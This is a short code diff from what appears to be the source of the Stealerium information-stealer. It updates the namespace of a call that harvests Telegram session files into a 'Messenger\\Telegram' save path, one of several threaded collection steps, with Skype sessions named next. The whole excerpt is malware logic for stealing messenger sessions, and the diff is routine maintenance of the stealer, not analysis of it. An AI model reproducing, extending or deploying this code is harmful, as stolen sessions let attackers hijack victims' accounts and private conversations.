@@ -58,7 +58,7 @@ namespace Stealerium.Helpers
 
                 // Write telegram session
                 threads.Add(new Thread(() =>
-                    Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram")
+                    Target.Messengers.Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram")
                 ));
 
                 // Write skype session
